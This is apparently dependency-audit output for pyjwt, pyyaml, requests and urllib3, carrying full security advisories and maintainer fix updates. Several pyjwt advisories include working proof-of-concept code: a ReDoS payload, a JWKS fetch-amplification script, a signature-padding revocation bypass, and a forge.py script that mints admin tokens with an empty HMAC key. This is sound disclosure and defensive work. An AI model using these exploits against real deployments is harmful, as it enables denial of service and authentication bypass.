+pyjwt    1.7.1   PYSEC-2026-4144     2.14.0        ### Summary  PyJWT 2.13.0 `PyJWKClient` followed HTTP redirects while fetching a JWKS, without validating the redirect destination. A configured trusted endpoint could therefore redirect the client to a different host.  ### Impact  When an application uses `PyJWKClient` with caller-supplied request headers and an attacker can influence the configured endpoint's response, the redirected request could expose those headers and the redirected response could be used as authoritative key material. This could cause JWKS trust poisoning and, in affected mixed-configuration applications, forged JWT acceptance. The issue requires an attacker-influenced redirect from the configured JWKS endpoint; it is not triggered by a token `kid` alone.  ### Affected versions  PyJWT `<= 2.13.0`.  ### Fix  The issue is fixed on `master` in commit [`0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56`](https://github.com/jpadilla/pyjwt/commit/0a795b8e1f6ef08f634aa7086fc41cc6d5ce3e56). `PyJWKClient` now disables automatic redirects for JWKS fetches. Regression tests verify that a redirect is rejected without contacting its destination, while normal fetches, headers, caching, errors, timeouts, and SSL context remain covered.  The fix is present in the unreleased development branch. The patched version will be recorded after a released PyJWT 2.x version containing the fix is confirmed.  ### Credit  Credit: the original reporter of GHSA-9v7f-9g4p-ffgj. Additional redirect header-leak and cache-poisoning evidence from the newer duplicate report GHSA-43g3-98cx-x446 is preserved in the duplicate record and informed this canonical advisory update.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.
+pyjwt    1.7.1   PYSEC-2026-4148     2.14.0        ### Summary There is a Re-DoS vulnerability in the `is_pem_format` function which results in a intesive CPU usage if an attacker is been able to provide a custom certificate.   ### Details The problem is that the lazy quantifier `.+?` will always first try to match as little as possible until it finds a `---- END`. Normally this means the complexity of this should be O(N). However, by providing an input which consists only of `----BEGIN CERTIFICATE-----` lines and no `---- END` line, the regex algorithm will first try to match the first line and then, with the lazy quantifier, all the lines until the end O(N), which then fails since it is unable to find a `---- END` line. It will then jump to the next line, resulting in N re-scans of the whole string, which means the complexity basically results in O(N²).    ### PoC ```python import time import re   BEGIN_LINE = b"-----BEGIN CERTIFICATE-----\n"  _PEMS = {     b"CERTIFICATE",     b"TRUSTED CERTIFICATE",     b"PRIVATE KEY",     b"PUBLIC KEY",     b"ENCRYPTED PRIVATE KEY",     b"OPENSSH PRIVATE KEY",     b"DSA PRIVATE KEY",     b"RSA PRIVATE KEY",     b"RSA PUBLIC KEY",     b"EC PRIVATE KEY",     b"DH PARAMETERS",     b"NEW CERTIFICATE REQUEST",     b"CERTIFICATE REQUEST",     b"SSH2 PUBLIC KEY",     b"SSH2 ENCRYPTED PRIVATE KEY",     b"X509 CRL", }  _PEM_RE = re.compile(     b"----[- ]BEGIN ("     + b"|".join(_PEMS)     + b""")[- ]----\r? .+?\r? ----[- ]END \\1[- ]----\r?\n?""",     re.DOTALL, )   def is_pem_format(key: bytes) -> bool:     return bool(_PEM_RE.search(key))   def make_payload(num_headers: int) -> bytes:     return BEGIN_LINE * num_headers   def measure(num_headers: int) -> float:     payload = make_payload(num_headers)     start = time.perf_counter()     is_pem_format(payload)  # returns False, but burns CPU getting there     elapsed = time.perf_counter() - start     print(         f"  headers={num_headers:>4}  size={len(payload)//1024:>3} KB"         f"   time={elapsed*1000:>7.1f} ms"     )     return elapsed   for n in (1000, 2000, 4000, 8000):     measure(n) ```  ### Impact The attacker could use extensive resources, which could make the resource (e.g. a web server) unavailable.   ### Maintainer update (2026-09-10):  We reproduced the reported quadratic regex behavior on malformed PEM-like input: doubling repeated BEGIN lines produced approximately fourfold runtime growth, while equal-sized ordinary input remained negligible. The affected path is reached when an application passes attacker-controlled key or certificate bytes to PyJWT’s key preparation, and the impact is resource exhaustion. The fix is on master in commit 8b4e233a22206b34ec1186e912e75c0b2396ac07; it replaces the backtracking PEM regex with a bounded marker scan. Fresh Astra/max review accepted the fix and confirmed malformed, mixed-label, and valid-input controls. This is a distinct ReDoS finding from the later PEM-recognition report that shares the implementation commit. The fix has not yet shipped in a released PyJWT 2.x version, so this advisory is being moved to draft and remains unpublished pending release.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with the release recorded as the patched version.
+pyjwt    1.7.1   PYSEC-2026-4140     2.14.0        Summary CVE-2026-48524 (GHSA-fhv5-28vv-h8m8, "PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS)") was fixed in 2.13.0 by stopping fetch_data() from clearing the cache on a fetch error. That closed one amplification path but did not add the mitigation the advisory's title implies: there is still no rate-limit, negative-cache, or minimum-refresh-interval for unknown kids.  At HEAD, get_signing_key(kid) (jwt/jwks_client.py:185-211), on any unknown kid, calls get_signing_keys(refresh=True), and refresh=True bypasses jwk_set_cache unconditionally and forces a fresh fetch_data(). The kid is read from the unverified token header (get_signing_key_from_jwt decodes with verify_signature=False), so no valid token and no authentication is required. lru_cache does not cache the raised exception, so even the same unknown kid repeated re-fetches on every call.  Affected pyjwt <= 2.13.0 (the latest release; the patched release for CVE-2026-48524). No fixed version yet.  Proof of concept (verified on 2.13.0, cache enabled = realistic prod config) import threading, http.server, socketserver, json from jwt import PyJWKClient hits = {'n': 0} JWKS = json.dumps({"keys":[{"kty":"oct","kid":"real","k":"AAAA"}]}).encode() class H(http.server.BaseHTTPRequestHandler):     def do_GET(self):         hits['n'] += 1         self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers()         self.wfile.write(JWKS)     def log_message(self,*a): pass srv = socketserver.TCPServer(('[127.0.0.1](https://127.0.0.1/)',0), H); port = srv.server_address[1] threading.Thread(target=srv.serve_forever, daemon=True).start() c = PyJWKClient(f'http://127.0.0.1/:{port}[/jwks](tg://bot_command?command=jwks).json', cache_keys=True, lifespan=3600) for i in range(8):     try: c.get_signing_key(f'attacker-unknown-kid-{i}')     except Exception: pass before = hits['n'] for _ in range(5):     try: c.get_signing_key('same-unknown')     except Exception: pass print('distinct unknown kids: 8 -> fetches:', hits['n']) print('same unknown kid x5 -> extra fetches:', hits['n'] - before)  Output:   distinct unknown kids: 8 -> fetches: 9   same unknown kid x5 -> extra fetches: 5 Each unknown kid forces a fresh JWKS fetch; a repeated identical unknown kid still re-fetches every time against an unexpired cache. No rate-limit or negative-cache.  Impact One unauthenticated request -> one outbound JWKS HTTP fetch + full JSON parse on the victim server. An attacker floods tokens carrying junk kids, so the victim hammers its own JWKS/IdP endpoint (amplification: attacker -> victim -> IdP), exhausting victim CPU/sockets and potentially tripping the JWKS provider's rate-limit, causing an application-wide auth outage. This is the unauthenticated DoS the parent advisory is named for, still reachable after the 2.13.0 fix.  Suggested fix Guard the forced refresh on unknown kids: negative-cache unknown kids for a short TTL, or enforce a minimum interval between forced JWKS refreshes, so a repeated or unknown kid cannot force unbounded fetches.  Note: the same-kid-repeated result (5 identical unknown kids producing 5 fetches against an unexpired cache) shows this is request amplification, not legitimate key-rotation handling, since that refresh can never succeed.  Reported by Babakizo (Securva).  ## Maintainer update — 2026-09-10  The maintainer confirmed the reported behavior against PyJWT 2.13.0. With JWKS caching enabled, an unknown `kid` previously forced an unconditional JWKS refresh, including when the same unknown value was repeated while the cached key set was still valid. This allowed unauthenticated token headers to cause unnecessary outbound JWKS requests and repeated parsing work.  The fix is now on `master` in commit `ba4853a`. `PyJWKClient` now applies a 30-second cooldown after successful JWKS fetches before permitting another unknown-`kid` refresh, serializes concurrent refresh decisions per client, and allows callers to configure or disable the cooldown. Cache-disabled behavior and immediate retry after failed fetches remain unchanged.  Regression tests cover repeated unknown kids, cooldown expiry, concurrent misses, cache-disabled operation, and invalid cooldown values. The available full tox matrix, Ruff, and mypy checks pass. The fix will be included in the next released 2.x version.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.
+pyjwt    1.7.1   PYSEC-2026-4147     2.14.0        ## Summary  PyJWT 2.13.0 accepts compact JWS signature segments containing characters that are not in the Base64URL alphabet. Appending `!!!!` to a valid signature does not change the decoded signature bytes or authenticated claims, but it changes the serialized token and its SHA-256 hash. An application that indexes logout or revocation state by the raw token therefore rejects the logged-out token and accepts its no-key alternate serialization.  This report separates two issues: permissive compact-JWS decoding is the library behavior, while using raw serialized JWT text as a security identity is a dangerous application composition. A `jti`-indexed control blocks both representations.  ## Affected Version  Confirmed with PyJWT 2.13.0 on CPython 3.13. The mutation changes only the signature segment and requires no signing key.  ## End-to-End Reproduction  ```bash .venv-research/bin/python 06-practical-testing/revocation-bypass-lab.py ```  The loopback-only lab performs:  1. Issue a valid HS256 admin token. 2. Access `/protected` successfully. 3. Log out the canonical token and store `SHA256(raw_token)`. 4. Confirm canonical replay returns HTTP 401. 5. Append `!!!!` to only the signature segment. 6. Confirm the mutated token has the same verified claims and signature bytes,    a different raw hash, and receives HTTP 200. 7. Repeat with `jti`-indexed revocation and confirm both forms return HTTP 401.  Observed statuses for raw-token revocation were `200 -> logout -> 401` for the canonical token and `200` for the alternate serialization. The `jti` control returned `401` for both replays after logout.  ## Security Boundaries and Severity  This is not signature forgery: the attacker starts with a valid token and cannot alter its claims. Impact requires a consumer to bind revocation, replay state, rate limits, or cache identity to the raw compact string. Under that composition, an authenticated user can bypass logout or token-specific revocation without the signing key. Medium is suggested for triage because the security impact is real but application-dependent.  ## Recommended Fix  - Reject signature segments containing characters outside `[A-Za-z0-9_-]`. - Reject padding and other non-canonical Base64URL encodings for compact JWS. - Add regression tests proving malformed signature encodings fail before or   during verification. - Document that applications must use a semantic identifier such as `jti`, not   the raw serialized token, for revocation and replay state.  ## Maintainer update — 2026-09-09  We reproduced the reported behavior on the verified `master` commit `8915570`: appending `!!!!` to a valid compact-JWS signature segment is accepted, produces the same decoded signature bytes and claims, and changes the serialized token hash. Existing JWS verification controls pass. The behavior is present in the tested release range represented by tags `2.4.0`, `2.8.0`, `2.10.1`, `2.12.1`, and `2.13.0`.  The security impact is conditional on an application using the raw serialized token as the identity for logout, revocation, replay, rate-limit, or cache state. Under that composition, an attacker who already holds a valid token can use an alternate serialization after the canonical string is revoked. This is not signature forgery or claim alteration; applications should use a semantic identifier such as `jti` for token identity.  The report is ready to be accepted as a draft for continued remediation. A narrow fix assessment recommends rejecting non-canonical Base64URL characters and padding in compact-JWS segments. No fix commit or release is claimed yet.  ### Maintainer update — 2026-09-09  The fix has been rebased onto the current `master` as `e6f48401001609a8f99e71fcaf355fb895d508a8` and is ready to be pushed. Compact-JWS header, payload, and signature segments are now required to use the unpadded Base64URL alphabet and canonical re-encoding; a signature segment containing non-canonical characters such as `!!!!` is rejected before verification. Valid detached `b64=false` handling remains supported.  Verification on the rebased fix commit passed 372 tests with 4 intentional cryptography-environment skips; Ruff formatting/lint and `git diff --check` passed. The compressed-payload regression fixture was updated to valid canonical compact-JWS encoding. No release containing the fix has been published yet, so the patched version remains unset pending release planning.  The advisory remains medium severity and unpublished.  ## Classification update — 2026-09-10  We completed the advisory classification review. The proposed CVSS 3.1 vector is `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N` and the proposed CWE classification is CWE-180. The issue permits alternate non-canonical serializations of an already valid signed token to bypass applications that identify tokens by their raw serialization; it does not forge signatures or alter claims. CWE-180 captures validation/canonicalization ordering.  These metadata changes do not alter the affected range, fix status, or lifecycle state.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.
+pyjwt    1.7.1   GHSA-pxh4-856f-4h89 2.14.0        ### Summary  `HMACAlgorithm.from_jwk` accepts a symmetric (`kty=oct`) JWK whose `k` value is the empty string and returns a zero-length key without raising. When a token is then verified with that key object (a `PyJWK`, or a `PyJWK` resolved by `PyJWKSet` / `PyJWKClient`), the HMAC verifier computes `HMAC(key=b"", signing_input)` and accepts any token an attacker forged with the same empty key. The attacker needs no secret knowledge: they reproduce the digest locally with an empty key and set the token's `kid` to the empty-`k` JWK.  The empty-key rejection that `HMACAlgorithm.prepare_key` performs for string/bytes secrets (added in 2.13.0) was never propagated to the sibling `from_jwk` code path, so the JWK/JWKS verification route stays exploitable. Under default decode options this path only emits an `InsecureKeyLengthWarning`, not an error, so verification still succeeds. This is the same "empty/nil HMAC key is accepted by verify" defect the JWT ecosystem is currently closing library-side: fast-jwt CVE-2026-44351 (CVSS 9.1) and ruby-jwt CVE-2026-45363 both added a library-side reject-empty-HMAC-key precondition.  ### Affected versions  `PyJWT` (PyPI package `pyjwt`) `<= 2.13.0`, current `master` at commit `7144e4534c34810f4525dc4578a32addd8212cff`. The string/bytes secret path is already guarded in 2.13.0; the JWK/JWKS path is not.  ### Privilege required  Unauthenticated. Any party who can reach a JWT-verifying endpoint of an application that verifies via a `PyJWK` / `PyJWKSet` / `PyJWKClient` whose oct key has an empty `k` can forge tokens with arbitrary claims.  Preconditions: the verifier resolves the HMAC key from a JWK/JWKS whose oct entry carries an empty `k`. This occurs when the signing secret is sourced from an unset environment variable / unset config row / key-finder fallback that base64url-encodes `b""` into the published JWKS, or when the application trusts a JWKS containing such an entry. The equivalent unset-secret case for the string-secret API (`jwt.decode(token, key="")`) is already rejected in 2.13.0; the JWK route is the remaining reachable surface for the same misconfiguration.  ### Vulnerable code  `jwt/algorithms.py`, `HMACAlgorithm.from_jwk` (line 380):  ```python @staticmethod def from_jwk(jwk: str | JWKDict) -> bytes:     try:         if isinstance(jwk, str):             obj: JWKDict = json.loads(jwk)         elif isinstance(jwk, dict):             obj = jwk         else:             raise ValueError     except ValueError:         raise InvalidKeyError("Key is not valid JSON") from None      if obj.get("kty") != "oct":         raise InvalidKeyError("Not an HMAC key")      return base64url_decode(obj["k"])   # <-- empty k -> b"", no rejection ```  Contrast the sibling `prepare_key`, which DID get the guard (lines 325-329):  ```python def prepare_key(self, key: str | bytes) -> bytes:     key_bytes = force_bytes(key)      if len(key_bytes) == 0:         raise InvalidKeyError("HMAC key must not be empty.") ```  In `jwt/api_jws.py`, `_verify_signature` (lines 389-416) uses the `PyJWK` key material directly, bypassing `prepare_key`, and the length warning is non-fatal by default:  ```python         if isinstance(key, PyJWK):             if alg != key.algorithm_name:                 raise InvalidAlgorithmError(                     f"Token algorithm {alg!r} does not match the key's "                     f"algorithm {key.algorithm_name!r}"                 )             alg_obj = key.Algorithm             prepared_key = key.key            # from_jwk output (b""), prepare_key not run         else:             try:                 alg_obj = self.get_algorithm_by_name(alg)             except NotImplementedError as e:                 raise InvalidAlgorithmError("Algorithm not supported") from e             prepared_key = alg_obj.prepare_key(key)          key_length_msg = alg_obj.check_key_length(prepared_key)         if key_length_msg:             if effective_options.get("enforce_minimum_key_length", False):                 raise InvalidKeyError(key_length_msg)             else:                 warnings.warn(key_length_msg, InsecureKeyLengthWarning, stacklevel=4)  # default: warn only          if not alg_obj.verify(signing_input, prepared_key, signature):  # verify with b"" succeeds             raise InvalidSignatureError("Signature verification failed") ```  `PyJWK.__init__` sets `self.key = self.Algorithm.from_jwk(self._jwk_data)`, so a `{"kty":"oct","k":""}` JWK yields `PyJWK.key == b""`. `PyJWKSet` and `PyJWKClient.get_signing_key_from_jwt` build `PyJWK` objects the same way, so the JWKS-over-HTTP resolution route is affected identically.  The 2.13.0 release note (`CHANGELOG.rst`) documents the `prepare_key` JWK/PEM hardening (GHSA-xgmm-8j9v-c9wx) and the `PyJWK` alg-binding fix (GHSA-jq35-7prp-9v3f), and the test suite has `test_hmac_prepare_key_rejects_empty_key` plus `test_hmac_from_jwk_should_raise_exception_if_empty_json` (which tests an empty JSON object `{}`, not an oct key with empty `k`). The empty-`k` oct case is the untested sibling path this report closes.  ### How the attacker input reaches the sink  An unauthenticated HTTP client controls the bearer token entirely: its `kid` selects the empty-`k` oct JWK, and its signature is computed locally with the empty key. The token flows request header -> `PyJWKClient.get_signing_key_from_jwt` (kid resolution against the trusted JWKS) -> `jwt.decode` with the resolved `PyJWK` -> `_verify_signature` -> `HMACAlgorithm.verify(signing_input, b"", sig)`. No secret, credential, or prior session is required; the only server-side precondition is a JWKS oct entry with an empty `k`, which the "unset signing secret" configuration produces. This is the identical trust boundary the string-secret path already guards.  ### Proof of concept  ### End-to-end reproduction against pinned PyPI `pyjwt` 2.13.0 (two deployed Flask services)  Two services model a standard OIDC-style deployment: an auth service publishing a JWKS, and a protected resource server validating bearer tokens against that JWKS with PyJWT's documented `PyJWKClient` pattern. The auth service's signing secret is sourced from an unset env var (`SIGNING_SECRET` unset -> `""`), so the published oct JWK carries `k == ""`.  `idp.py` (auth service):  ```python import os, base64 from flask import Flask, jsonify app = Flask(__name__) SIGNING_SECRET = os.environ.get("SIGNING_SECRET", "")   # UNSET at runtime -> "" def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()  @app.route("/.well-known/jwks.json") def jwks():     return jsonify({"keys": [{         "kty": "oct", "use": "sig", "alg": "HS256",         "kid": "auth-signing-2026",         "k": b64u(SIGNING_SECRET.encode()),   # empty secret -> k == ""     }]})  if __name__ == "__main__":     app.run(port=9101) ```  `api.py` (protected resource server):  ```python from flask import Flask, request, jsonify import jwt from jwt import PyJWKClient app = Flask(__name__) jwks_client = PyJWKClient("http://127.0.0.1:9101/.well-known/jwks.json")  def authenticate():     auth = request.headers.get("Authorization", "")     if not auth.startswith("Bearer "):         return None, "missing bearer token"     token = auth.split(" ", 1)[1]     try:         signing_key = jwks_client.get_signing_key_from_jwt(token)  # resolves by kid         claims = jwt.decode(token, signing_key, algorithms=["HS256", "RS256"])     except Exception as e:         return None, "invalid token: %s" % type(e).__name__     return claims, None  @app.route("/api/admin/users") def admin_users():     claims, err = authenticate()     if err:         return jsonify({"error": err}), 401     if claims.get("role") != "admin":         return jsonify({"error": "forbidden"}), 403     return jsonify({"ok": True, "action": "list_all_users",                     "as_user": claims.get("sub"), "role": claims.get("role")})  if __name__ == "__main__":     app.run(port=9102) ```  `forge.py` (attacker; no secret knowledge):  ```python import hmac, hashlib, base64, json, sys def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode() header={"alg":"HS256","typ":"JWT","kid":"auth-signing-2026"} payload={"sub":"attacker@evil.example","role":"admin"} si=b64u(json.dumps(header,separators=(',',':')).encode())+"."+b64u(json.dumps(payload,separators=(',',':')).encode()) key = sys.argv[1].encode() if len(sys.argv)>1 else b""   # empty key sig=hmac.new(key, si.encode(), hashlib.sha256).digest() print(si+"."+b64u(sig)) ```  Run:  ```bash python -m venv v && ./v/bin/pip install "PyJWT==2.13.0" flask ( SIGNING_SECRET= ./v/bin/python idp.py & ) ; ./v/bin/python api.py & FORGED=$(./v/bin/python forge.py "") curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:9102/api/admin/users ```  Verbatim run (attack, both negative controls, sanity, and patched-build re-run):  ``` ### PyJWT version 2.13.0  ### JWKS published by the auth service (note the empty "k"): {"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]}  ### Baseline: unauthenticated request to admin endpoint HTTP 401  ### ATTACK: attacker forges HS256 admin token signed with the EMPTY key forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF1dGgtc2lnbmluZy0yMDI2In0.eyJzdWIiOiJhdHRhY2tlckBldmlsLmV4YW1wbGUiLCJyb2xlIjoiYWRtaW4ifQ.iwgDP9D-oD0zXWMEUhx710f_NjHWKkrLVgjPAOtEUSQ response: {"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}   <-- HTTP 200  ### NEGATIVE CONTROL 1: forge with a WRONG non-empty key (IdP still empty) -> reject {"error":"invalid token: InvalidSignatureError"}   <-- HTTP 401  ### NEGATIVE CONTROL 2: IdP restarted with a REAL non-empty secret; empty-key forgery must now fail JWKS now has non-empty k: {"keys":[{"alg":"HS256","k":"YS1yZWFsLTMyLWJ5dGUtc3Ryb25nLXNlY3JldC12YWx1ZS0xMjM0","kid":"auth-signing-2026","kty":"oct","use":"sig"}]} {"error":"invalid token: InvalidSignatureError"}   <-- HTTP 401  ### Sanity: a legitimately-signed token with the real secret is accepted {"action":"list_all_users","as_user":"attacker@evil.example","ok":true,"role":"admin"}   <-- HTTP 200  ### PATCHED BUILD (from_jwk rejects empty k): re-run the empty-key forgery -> now rejected JWKS (empty k, vulnerable config): {"keys":[{"alg":"HS256","k":"","kid":"auth-signing-2026","kty":"oct","use":"sig"}]} {"error":"invalid token: PyJWKSetError"}   <-- HTTP 401 ```  The attack returns HTTP 200 with `role:admin` from an unauthenticated forged token. Both negative controls (wrong non-empty key; real non-empty secret at the auth service) return 401, isolating the defect to empty-key acceptance. The patched build (the `from_jwk` fix below) rejects the forgery.  ### Impact  - Unauthenticated authentication bypass / token forgery: an attacker mints tokens   with arbitrary claims (`role:admin`, arbitrary `sub`) that verify successfully,   yielding full impersonation and privilege escalation on any endpoint gated by   such tokens. - Reachable through the documented JWKS verification API   (`PyJWKClient` / `PyJWKSet` / `PyJWK`), not just direct `HMACAlgorithm` use. - Triggered by the common "unset signing secret" misconfiguration that the   string-secret path already rejects in 2.13.0, leaving the JWK path as an   asymmetric gap.  ### Suggested fix  Reject a zero-length key in `HMACAlgorithm.from_jwk`, mirroring the guard that `prepare_key` already applies:  ```python if obj.get("kty") != "oct":     raise InvalidKeyError("Not an HMAC key")  key_bytes = base64url_decode(obj["k"]) if len(key_bytes) == 0:     raise InvalidKeyError("HMAC key must not be empty.") return key_bytes ```  This reuses the exact error message and length check the string/bytes path uses, so both HMAC key-loading routes enforce the same invariant. A regression test for the empty-`k` oct JWK belongs next to `test_hmac_from_jwk_should_raise_exception_if_empty_json`.  ### Fix PR  https://github.com/jpadilla/pyjwt-ghsa-pxh4-856f-4h89/pull/1 (private advisory temp fork, base `master`, branch `fix/hmac-from-jwk-reject-empty-key`, DCO-signed; adds `test_hmac_from_jwk_rejects_empty_k`; `test_algorithms.py`, `test_api_jwk.py`, `test_api_jws.py` pass).  ### Credit  Reported by tonghuaroot.  > Maintainer update (2026-09-10): We reproduced the reported behavior: an `oct` JWK with an empty `k` value was decoded to an empty HMAC key and accepted through the JWK/PyJWK verification path, while the raw string/bytes path correctly rejected an empty key. The fix adds the same empty-key validation at the JWK boundary and includes a regression test. It is committed as `af8181ca0bec5e6b372fbba9afbe23702b787ceb` and has passed the available project tox environments, including crypto and non-crypto tests on Python 3.9, 3.12, and 3.13, plus mypy, package metadata, and coverage checks. Fresh Astra/max review accepted the fix and confirmed that nonempty, binary, and asymmetric-key behavior remains unchanged. The fix has not yet shipped in a released PyJWT version, so this advisory is being moved to draft and remains unpublished pending release.  ## Maintainer update — 2026-09-11  The verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.
+pyyaml   5.3.1   PYSEC-2021-142      5.4           A vulnerability was discovered in the PyYAML library in versions before 5.4, where it is susceptible to arbitrary code execution when it processes untrusted YAML files through the full_load method or with the FullLoader loader. Applications that use the library to process untrusted input may be vulnerable to this flaw. This flaw allows an attacker to execute arbitrary code on the system by abusing the python/object/new constructor. This flaw is due to an incomplete fix for CVE-2020-1747.
+requests 2.25.1  PYSEC-2023-74       2.31.0        Requests is a HTTP library. Since Requests 2.3.0, Requests has been leaking Proxy-Authorization headers to destination servers when redirected to an HTTPS endpoint. This is a product of how we use `rebuild_proxies` to reattach the `Proxy-Authorization` header to requests. For HTTP connections sent through the tunnel, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into the tunneled request. This results in Requests forwarding proxy credentials to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate sensitive information. This issue has been patched in version 2.31.0.
+requests 2.25.1  PYSEC-2026-1873     2.32.0        When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.  This occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.  This behavior affects versions of `requests` prior to 2.32.0.
+requests 2.25.1  PYSEC-2026-1872     2.32.4        ### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2
+requests 2.25.1  PYSEC-2026-2275     2.33.0        Requests is a HTTP library. Prior to version 2.33.0, the `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one. Standard usage of the Requests library is not affected by this vulnerability. Only applications that call `extract_zipped_paths()` directly are impacted. Starting in version 2.33.0, the library extracts files to a non-deterministic location. If developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.
+urllib3  1.26.4  PYSEC-2021-108      1.26.5        An issue was discovered in urllib3 before 1.26.5. When provided with a URL containing many @ characters in the authority component, the authority regular expression exhibits catastrophic backtracking, causing a denial of service if a URL were passed as a parameter or redirected to via an HTTP redirect.
+urllib3  1.26.4  PYSEC-2023-192      1.26.17,2.0.6 urllib3 is a user-friendly HTTP client library for Python. urllib3 doesn't treat the `Cookie` HTTP header special or provide any helpers for managing cookies over HTTP, that is the responsibility of the user. However, it is possible for a user to specify a `Cookie` header and unknowingly leak information via HTTP redirects to a different origin if that user doesn't disable redirects explicitly. This issue has been patched in urllib3 version 1.26.17 or 2.0.5.
+urllib3  1.26.4  PYSEC-2023-212      1.26.18,2.0.7 urllib3 is a user-friendly HTTP client library for Python. urllib3 previously wouldn't remove the HTTP request body when an HTTP redirect response using status 301, 302, or 303 after the request had its method changed from one that could accept a request body (like `POST`) to `GET` as is required by HTTP RFCs. Although this behavior is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers. Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable. Both of the following conditions must be true to be affected by this vulnerability: 1. Using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON) and 2. The origin service is compromised and starts redirecting using 301, 302, or 303 to a malicious peer or the redirected-to service becomes compromised. This issue has been addressed in versions 1.26.18 and 2.0.7 and users are advised to update to resolve this issue. Users unable to update should disable redirects for services that aren't expecting to respond with redirects with `redirects=False` and disable automatic redirects with `redirects=False` and handle 301, 302, and 303 redirects manually by stripping the HTTP request body.
+urllib3  1.26.4  PYSEC-2026-141      2.7.0         urllib3 is an HTTP client library for Python. From 1.23 to before 2.7.0, cross-origin redirects followed from the low-level API via ProxyManager.connection_from_url().urlopen(..., assert_same_host=False) still forward these sensitive headers. This vulnerability is fixed in 2.7.0.
+urllib3  1.26.4  PYSEC-2026-1999     2.5.0         urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request("GET", "https://httpbin.org/redirect/1", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request("GET", "https://httpbin.org/redirect/1") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level.
+urllib3  1.26.4  PYSEC-2026-1998     2.6.0         ## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers["content-encoding"]` contains a safe number of encodings before reading the response content.
